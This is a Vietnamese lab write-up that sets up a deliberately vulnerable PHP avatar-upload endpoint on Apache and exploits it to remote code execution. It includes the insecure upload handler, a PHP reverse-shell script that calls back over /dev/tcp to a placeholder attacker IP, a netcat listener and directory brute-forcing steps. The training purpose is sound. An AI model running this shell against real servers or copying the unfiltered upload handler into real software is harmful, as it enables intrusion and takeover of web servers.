
# Write-up: Phân tích và Khai thác lỗ hổng RCE (Unrestricted File Upload)

Bài viết này trình bày chi tiết quá trình thiết lập kịch bản giả lập (Lab), phân tích lỗ hổng và thực hiện hoạt động khai thác **Unrestricted File Upload** dẫn đến **Remote Code Execution (RCE)** trên một ứng dụng web.

### 1. Thông tin cấu hình (Environment Setup)

Kịch bản được xây dựng dựa trên sự tương tác giữa hai máy ảo nội bộ:
*   **Máy Mục tiêu (Target):** Địa chỉ IP `<TARGET_IP>`. Máy chủ chạy Ubuntu Server 24.04, cung cấp dịch vụ web thông qua Apache2 và có cài đặt PHP.
*   **Máy Tấn công (Attacker):** Địa chỉ IP `<ATTACKER_IP>`. Máy tính của người kiểm thử chạy hệ điều hành Kali Linux.

---

### 2. Thiết kế kịch bản và Xây dựng Lab (Lab Setup & Rationale)


**2.1. Frontend (React + Tailwind + Vite)**

Mình sẽ nhờ AI code ra một trang web để thực hiện lỗ hổng RCE, dựng một giao diện blog công nghệ. Ứng dụng này được xây dựng dựa trên sự kết hợp của 4 công nghệ:
- **Node.js:** Trước khi viết code, Node.js được cài đặt trên máy người viết để đóng vai trò làm "Môi trường nền tảng". Đi kèm với nó là NPM (Node Package Manager). Nó chịu trách nhiệm tải về các công cụ như Vite, React, Tailwind và giúp máy tính của bạn chạy được cái mớ code phức tạp trong folder.
- **React:** Đây là một thư viện JavaScript chuyên dùng để xây dựng giao diện (UI). Nhiệm vụ của React trong bài Lab này là quản lý các thành phần giao diện (Component) như Navbar, Form đăng tải và xử lý logic định tuyến nội bộ (React Router). Nhờ đó, khi người dùng bấm chuyển trang, trang web không phải tải lại toàn bộ.
- **Tailwind CSS:** Đây là framework giúp viết CSS thông qua các class nhúng trực tiếp vào thẻ HTML (ví dụ: `text-neon-blue bg-slate-900`).
- **Vite:** Bản thân React và Tailwind là những đoạn code phức tạp, trình duyệt không thể đọc trực tiếp các thư mục mã nguồn này. Vite (chạy trên môi trường Node.js) đóng vai trò là "Máy đóng gói" (Build Tool). Nó quét toàn bộ code rườm rà ở trên và làm phẳng nó thành một thư mục duy nhất gọi là `dist` chứa thuần túy các file tĩnh (HTML, CSS và JavaScript chuẩn).

```bash
# Sử dụng cmd ở thư mục chứa folder project
npm install
npm run build
```

Sau khi quá trình biên dịch hoàn tất, thư mục `dist` sẽ được triển khai lên thư mục gốc (ví dụ là thư mục chứa code của bạn) và web máy chủ mục tiêu (`/var/www/html/`).

Cụ thể, quá trình chuyển đổi tệp từ máy Windows sang máy chủ Ubuntu được thực hiện thông qua giao thức SCP (Secure Copy):
```bash
# Lệnh chạy trên Windows (PowerShell) để đẩy thư mục dist lên Ubuntu
scp -r c:\your_path_project\dist <USERNAME>@<TARGET_IP>:~
```

Sau đó, trên máy chủ Ubuntu, tệp tĩnh được đưa vào đúng vị trí của Apache:
```bash
# Lệnh chạy trên máy chủ Ubuntu (Terminal) 
sudo rm -rf /var/www/html/*
sudo cp -r ~/dist/* /var/www/html/
sudo chown -R www-data:www-data /var/www/html
```

**2.2. Lỗ hổng bảo mật**

Để tiếp cận mục tiêu, ứng dụng yêu cầu người dùng phải tương tác: Đăng ký tài khoản -> Đăng nhập vào hệ thống -> Truy cập trang Hồ sơ cá nhân (Profile). Tại chính trang quản lý cá nhân này, tính năng "Đồng bộ hóa Ảnh đại diện" (Avatar Upload) được thiết kế như một biểu mẫu thông thường, nhưng thực chất chứa đường dẫn gửi tệp (POST method) đi thẳng đến hệ thống Backend xử lý tĩnh là tệp `upload_handler.php`.

**2.3. Backend xử lý lỏng lẻo**

Tệp `upload_handler.php` được đặt ngang cấp với `index.html` nhằm đón dữ liệu từ bảng điều khiển ẩn.

Mã nguồn của `upload_handler.php` được thiết kế bỏ qua mọi chuẩn mực bảo mật:
```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

// Vulnerability: Move data into the execution directory without reviewing the file extension
if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    // Target file saved. Do not redirect - the attacker must find the /uploads/ folder.
    echo "File saved successfully.";
} else {
    echo "Upload failed.";
}
?>
```

Với cấu hình này, bất kì tệp tin nào được gửi qua form `upload_handler.php` cũng sẽ được sao chép vào thư mục con `/var/www/html/uploads/` (đã được cấu hình cởi mở quyền truy xuất).

---

### 3. Phân tích lỗ hổng (Vulnerability Analysis)

Hệ thống được thiết kế tồn đọng lỗ hổng **Unrestricted File Upload** (CWE-434).

Nguyên lý sai sót xuất phát từ hàm `move_uploaded_file()`. Hệ thống đã lưu tệp thẳng vào thư mục cấu trúc (`/uploads/`) mà không tiến hành kiểm duyệt kiểu dữ liệu nội bộ (MIME Type) hay đuôi mở rộng (Extension filtering).

Hệ lụy trực tiếp: Kho lưu trữ `/uploads/` nằm sâu trong Web Root của Apache. Do Apache trên máy Ubuntu được nạp thêm `mod_php` nên khi có một yêu cầu chỉ định tài nguyên với đuôi `.php` (ví dụ: truy cập web bằng đường dẫn tệp trực tiếp), hành động mặc định của máy chủ là biên dịch mã PHP đó bằng phân luồng hệ thống chứ không trả về dạng mã nguồn văn bản. Do vậy là nếu Dev web không có filter những file upload lên thì sẽ dẫn tới lỗ hổng RCE

---

### 4. Quá trình Khai thác (Exploitation Phase)

Chi tiết phiên thực hành từ thiết bị Kali Linux (chức năng Attacker) như sau:

**Bước 1: Viết Script ReverseShell**
Người kiểm thử nhận biết được nền tảng vận hành trên cơ sở PHP. Một tệp tin gọi phản hồi hệ thống (Reverse Shell Code) được tạo lập, lưu dưới tên `shell.php`. Điểm mù này yêu cầu máy chủ đích sinh ra một kết nối `bash` để tương tác trực tuyến về phía Attacker:

```php
<?php
// Điều hướng kết nối về Terminal trên Kali Linux
$ip = '<ATTACKER_IP>'; 
$port = 4444;

// Thực thi lệnh hệ thống để tạo Reverse Shell
// bash -i: Mở shell ở chế độ tương tác (interactive)
// >& /dev/tcp/$ip/$port: Chuyển hướng đầu ra (stdout) và thông báo lỗi (stderr) tới máy Attacker qua TCP
// 0>&1: Chuyển hướng đầu vào (stdin) để nhận lệnh từ máy Attacker thông qua kết nối đã thiết lập

exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

**Bước 2: Chuẩn bị phiên hứng kết nối**
Sau khi xác định chuẩn `port` và `ip` được gán vào kịch bản tấn công, tiến trình `netcat` tại Kali Linux khởi chạy chức năng lắng nghe chủ động tại Cổng 4444:
```bash
# Lắng nghe giao thức trả về
nc -lvnp 4444
```

**Bước 3: Tải tệp lên và Rà quét đường dẫn (Delivery & Bruteforcing)**
Truy cập `<TARGET_IP>`, trải qua mô phỏng Đăng ký và Đăng nhập để tiến vào trang Profile cá nhân. Thông qua form Đồng bộ Ảnh đại diện hợp lệ trên màn hình, tiến hành tải lên tệp tin Reverse Shell (`shell.php`). Biểu mẫu được đẩy trực tiếp đến `upload_handler.php` của hệ thống máy chủ nội bộ.

Hệ thống ở bài lab này ẩn đi thư mục chứa ảnh tải lên. Vì vậy, máy chủ sẽ chỉ trả lời "File saved successfully.". Khi đó, kẻ tấn công phải sử dụng kỹ thuật Directory Bruteforcing (như công cụ `dirsearch` hoặc `gobuster`) để rà quét và dò tìm thư mục gốc trên máy chủ:

```bash
dirsearch -u http://<TARGET_IP>/ 
# Kết quả trả về (ví dụ):
# [200] GET /uploads/ -> Phát hiện thư mục có thể chứa file tĩnh tải lên
```

**Bước 4: Kích hoạt thủ công và Chiếm quyền kiểm soát (Execution & Exploitation)**
Kẻ tấn công điều hướng trên trình duyệt truy cập thủ công vào đường dẫn của tệp vừa tải: `http://<TARGET_IP>/uploads/shell.php`. Ngay tại thời điểm đó, quá trình biên dịch mã độc được máy chủ kích hoạt:

1. Trình duyệt chuyển sang trạng thái chờ tải xoay vòng (Hanging Connection) vì vòng đời kích hoạt shell đang sinh ra tiến trình chạy ngầm giữ kết nối liên tục ở bên trong Web Server.
2. Trên màn hình Netcat Terminal tại máy Kali báo hiệu dòng thông tin `Connection received`. Do hệ thống cấp cho Apache quyền hệ thống cục cằn là chạy bằng `www-data`, mọi thao tác trên bash shell vừa có được hiện quy thuộc quyền hạn này. 

Bằng hành động gõ lệnh `id` hoặc `whoami`, kết quả trả về sẽ là `www-data`. 

**Giải thích: Tại sao lại là `www-data` mà không phải tên máy (target) hay `root`?**
Khi bạn hack vào một dịch vụ nào đó, bạn sẽ bị giới hạn ở danh phận (quyền hạn) của chính dịch vụ đó. 
- Ở hệ điều hành Ubuntu, để giữ an toàn, Web Server (Apache) không bao giờ được phép dùng quyền `root` (vua) hay quyền của admin máy để chạy. 
- Thay vào đó, Ubuntu tạo ra một công nhân "quét rác" cấp thấp tên là `www-data` và bắt Apache phải dùng tài khoản này để nhặt file, đẩy web lên mạng. 

Khi bạn tải file `shell.php` lên, chính Apache là người chạy file đó giúp bạn. Thế nên, cái shell (kết nối) trả về cho bạn cũng chỉ mang danh phận của "anh công nhân" `www-data` này thôi. Dù đã vào được máy, bạn chỉ là "khách" cấp thấp, không thể vọc vạch sâu vào các file hệ thống quan trọng.

Để làm được những tác vụ nguy hiểm hơn (tắt máy, xem mật khẩu hệ thống,...), attacker phải tìm thêm một lỗ hổng khác trên Ubuntu để "nâng cấp" vỏ bọc `www-data` này lên thành `root`. Bước này được gọi là **Leo thang đặc quyền (Privilege Escalation)**.

---
